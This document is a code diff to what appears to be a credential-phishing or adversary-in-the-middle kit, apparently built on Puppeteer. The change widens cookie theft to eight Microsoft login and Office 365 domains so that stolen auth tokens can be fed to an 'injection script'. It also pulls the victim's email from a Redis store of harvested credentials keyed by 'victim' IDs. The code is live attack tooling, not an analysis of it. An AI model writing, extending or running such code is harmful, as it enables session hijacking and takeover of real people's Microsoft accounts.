@@ -110,20 +110,51 @@ exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
     }
     await necrohelp.Sleep(6000)
 
-    const allCookies = await page.cookies()
-    console.log(`[${taskId}] collected ${allCookies.length} post-auth cookies`)
+    // Collect cookies across ALL Microsoft domains — page.cookies() without
+    // args only returns cookies for the current URL's domain, missing the
+    // login.microsoftonline.com auth tokens the injection script also needs.
+    const MS_DOMAINS = [
+        'https://login.microsoftonline.com',
+        'https://login.live.com',
+        'https://outlook.office.com',
+        'https://outlook.office365.com',
+        'https://outlook.cloud.microsoft',
+        'https://www.office.com',
+        'https://m365.cloud.microsoft',
+        'https://substrate.office.com',
+    ]
+    let allCookies = []
+    try {
+        allCookies = await page.cookies(...MS_DOMAINS)
+    } catch(e) {
+        console.log(`[${taskId}] multi-domain cookies failed (${e.message}), falling back`)
+        allCookies = await page.cookies()
+    }
+    console.log(`[${taskId}] collected ${allCookies.length} post-auth cookies (all MS domains)`)
 
-    // Try to extract victim email from the page
+    // Look up victim email from Redis using the task's stored name (= victim UUID)
     let victimEmail = null
     try {
-        victimEmail = await page.evaluate(() => {
-            try { if (window.OWA && window.OWA.UserPrincipalName) return window.OWA.UserPrincipalName } catch(e) {}
-            try { const m = document.cookie.match(/OWA-userAddr=([^;]+)/); if (m) return decodeURIComponent(m[1]) } catch(e) {}
-            const m2 = (document.title || '').match(/([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})/);
-            if (m2) return m2[1]
-            return null
-        })
-    } catch(e) { console.log(`[${taskId}] email extract: ${e.message}`) }
+        const { createClient } = require('redis')
+        const rc = createClient({ url: process.env.REDIS_URL || 'redis://redis:6379' })
+        await rc.connect()
+        try {
+            // task hash stores name = victim UUID (%%%TRACKER%%% replacement)
+            const victimUUID = await rc.hGet(taskId, 'name')
+            console.log(`[${taskId}] victimUUID: ${victimUUID}`)
+            if (victimUUID) {
+                const credKeys = await rc.keys(`victim:${victimUUID}:creds:*`)
+                for (const k of credKeys) {
+                    const cred = await rc.hGetAll(k)
+                    const kl = (cred.Key || '').toLowerCase()
+                    if (['loginfmt', 'username', 'email', 'login'].includes(kl)) {
+                        victimEmail = cred.Value
+                        break
+                    }
+                }
+            }
+        } finally { await rc.quit() }
+    } catch(e) { console.log(`[${taskId}] email lookup: ${e.message}`) }
 
     const label = victimEmail || taskId
     let finalUrl = 'unknown'; try { finalUrl = page.url() } catch(e) {}
